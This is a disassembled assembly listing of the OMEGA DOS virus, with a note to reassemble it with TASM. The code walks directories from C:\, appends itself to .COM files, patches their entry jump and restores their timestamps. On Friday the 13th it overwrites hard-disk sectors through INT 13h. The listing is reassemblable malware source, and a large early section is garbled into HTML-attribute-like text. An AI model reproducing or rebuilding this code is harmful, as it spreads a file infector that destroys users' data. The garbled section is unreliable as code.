

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        OMEGA				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Dec-91					         ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ Disassembled by -=>Wasp<=- aka="">>Night Crawler< ûû="" ;ûû="" ûû="" ;ûû="" reassemble="" with="" tasm="" 2.0="" ûû="" ;ûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûû="" data_1e="" equ="" 80h="" seg_a="" segment="" byte="" public="" assume="" cs:seg_a,="" ds:seg_a="" org="" 100h="" omega="" proc="" far="" start:="" push="" ax="" push="" cs="" pop="" ds="" call="" sub_1="" ;="" (0106)="" omega="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_1="" proc="" near="" pop="" bp="" lea="" bp,[bp+1afh]="" ;="" load="" effective="" addr="" mov="" ah,1ah="" mov="" dx,bp="" int="" 21h="" ;="" dos="" services="" ah="function" 1ah="" ;="" set="" dta="" to="" ds:dx="" lea="" di,[bp+30h]="" ;="" load="" effective="" addr="" mov="" [bp+2eh],di="" call="" sub_5="" ;="" (01dc)="" call="" sub_4="" ;="" (0184)="" lea="" di,[bp+30h]="" ;="" load="" effective="" addr="" lea="" si,[bp-5]="" ;="" load="" effective="" addr="" nop="" call="" sub_2="" ;="" (015d)="" mov="" [bp+2eh],di="" call="" sub_5="" ;="" (01dc)="" call="" sub_4="" ;="" (0184)="" mov="" ah,2ah="" ;="" '*'="" int="" 21h="" ;="" dos="" services="" ah="function" 2ah="" ;="" get="" date,="" cx="year," dx="mon/day" cmp="" al,5="" jne="" loc_1="" ;="" jump="" if="" not="" equal="" cmp="" dl,0dh="" jne="" loc_1="" ;="" jump="" if="" not="" equal="" call="" sub_3="" ;="" (0165)="" int="" 20h="" ;="" program="" terminate="" loc_1:="" mov="" ah,1ah="" mov="" dx,data_1e="" int="" 21h="" ;="" dos="" services="" ah="function" 1ah="" ;="" set="" dta="" to="" ds:dx="" lea="" si,[bp-1b8h]="" ;="" load="" effective="" addr="" mov="" di,offset="" ds:[100h]="" cld="" ;="" clear="" direction="" movsw="" ;="" mov="" [si]="" to="" es:[di]="" movsb="" ;="" mov="" [si]="" to="" es:[di]="" push="" cs="" pop="" es="" push="" cs="" pop="" ds="" pop="" ax="" mov="" di,offset="" start="" push="" di="" retn="" sub_1="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_2="" proc="" near="" loc_2:="" lodsb="" ;="" string="" [si]="" to="" al="" stosb="" ;="" store="" al="" to="" es:[di]="" or="" al,al="" ;="" zero="" jnz="" loc_2="" ;="" jump="" if="" not="" zero="" dec="" di="" retn="" sub_2="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_3="" proc="" near="" mov="" ah,2="" mov="" dl,0eah="" int="" 21h="" ;="" dos="" services="" ah="function" 02h="" ;="" display="" char="" dl="" mov="" ax,308h="" mov="" cx,1="" mov="" dx,80h="" int="" 13h="" ;="" disk="" dl="drive" 0="" ah="func" 03h="" ;="" write="" sectors="" from="" mem="" es:bx="" mov="" ax,308h="" mov="" cx,1="" mov="" dx,180h="" int="" 13h="" ;="" disk="" dl="drive" 0="" ah="func" 03h="" ;="" write="" sectors="" from="" mem="" es:bx="" retn="" sub_3="" endp="" db="" 2ah,="" 00h="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_4="" proc="" near="" lea="" si,[bp-133h]="" ;="" load="" effective="" addr="" mov="" di,[bp+2eh]="" push="" di="" call="" sub_2="" ;="" (015d)="" pop="" di="" lea="" dx,[bp+30h]="" ;="" load="" effective="" addr="" mov="" ah,4eh="" ;="" 'n'="" mov="" cx,10h="" int="" 21h="" ;="" dos="" services="" ah="function" 4eh="" ;="" find="" 1st="" filenam="" match="" @ds:dx="" jc="" loc_ret_7="" ;="" jump="" if="" carry="" set="" loc_3:="" cmp="" byte="" ptr="" [bp+1eh],2eh="" ;="" '.'="" je="" loc_6="" ;="" jump="" if="" equal="" push="" di="" lea="" si,[bp+1eh]="" ;="" load="" effective="" addr="" call="" sub_2="" ;="" (015d)="" mov="" al,5ch="" ;="" '\'="" stosb="" ;="" store="" al="" to="" es:[di]="" mov="" [bp+2eh],di="" sub="" sp,15h="" mov="" cx,15h="" mov="" di,sp="" mov="" si,bp="" locloop_4:="" movsb="" ;="" mov="" [si]="" to="" es:[di]="" loop="" locloop_4="" ;="" loop="" if="" cx=""> 0
  
		CALL	SUB_5			; (01DC)
		MOV	CX,15H
		MOV	SI,SP
		MOV	DI,BP
  
LOCLOOP_5:
		MOVSB				; Mov [si] to es:[di]
		LOOP	LOCLOOP_5		; Loop if cx > 0
  
		ADD	SP,15H
		POP	DI
LOC_6:
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_RET_7		; Jump if carry Set
		JMP	SHORT LOC_3		; (019C)
  
LOC_RET_7:
		RETN
SUB_4		ENDP
  
		DB	 2AH, 2EH, 43H, 4FH, 4DH, 00H
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
SUB_5		PROC	NEAR
		LEA	SI,[BP-0DFH]		; Load effective addr
		MOV	DI,[BP+2EH]
		CALL	SUB_2			; (015D)
		LEA	DX,[BP+30H]		; Load effective addr
		MOV	AH,4EH			; 'N'
		MOV	CX,0
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_RET_11		; Jump if carry Set
LOC_8:
		CMP	WORD PTR [BP+1AH],0F000H
		JA	LOC_10			; Jump if above
		LEA	SI,[BP+1EH]		; Load effective addr
		MOV	DI,[BP+2EH]
		CALL	SUB_2			; (015D)
		LEA	DX,[BP+30H]		; Load effective addr
		MOV	AX,3D02H
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		JC	LOC_10			; Jump if carry Set
		MOV	BX,AX
		MOV	AX,4202H
		MOV	DX,0FF21H
		MOV	CX,0FFFFH
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_9			; Jump if carry Set
		MOV	WORD PTR [BP+2BH],0
		LEA	DX,[BP+2BH]		; Load effective addr
		MOV	AH,3FH			; '?'
		MOV	CX,2
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		JC	LOC_9			; Jump if carry Set
		CMP	WORD PTR [BP+2BH],2E2AH
		JE	LOC_9			; Jump if equal
		CALL	SUB_6			; (0243)
LOC_9:
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
LOC_10:
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_RET_11		; Jump if carry Set
		JMP	SHORT LOC_8		; (01F2)
  
LOC_RET_11:
		RETN
SUB_5		ENDP
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
SUB_6		PROC	NEAR
		MOV	AX,4200H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JNC	LOC_12			; Jump if carry=0
		JMP	SHORT LOC_RET_13	; (02AF)
LOC_12:
		MOV	AH,3FH			; '?'
		MOV	CX,3
		LEA	DX,[BP+2BH]		; Load effective addr
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,4202H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AH,40H			; '@'
		MOV	CX,3
		LEA	DX,[BP+2BH]		; Load effective addr
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AH,40H			; '@'
		MOV	CX,1B5H
		LEA	DX,[BP-1B5H]		; Load effective addr
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,4200H
		MOV	CX,0
		MOV	DX,0
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,[BP+1AH]
		MOV	DI,OFFSET DS:[101H]
		STOSW				; Store ax to es:[di]
		MOV	AH,40H			; '@'
		MOV	CX,3
		MOV	DX,OFFSET DS:[100H]
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		JC	LOC_RET_13		; Jump if carry Set
		MOV	AX,5701H
		MOV	CX,[BP+16H]
		MOV	DX,[BP+18H]
		INT	21H			; DOS Services  ah=function 57h
						;  get/set file date & time
  
LOC_RET_13:
		RETN
SUB_6		ENDP
  
		DB	 43H, 3AH, 5CH, 00H, 00H
  
SEG_A		ENDS
  
  
  
		END	START

</=->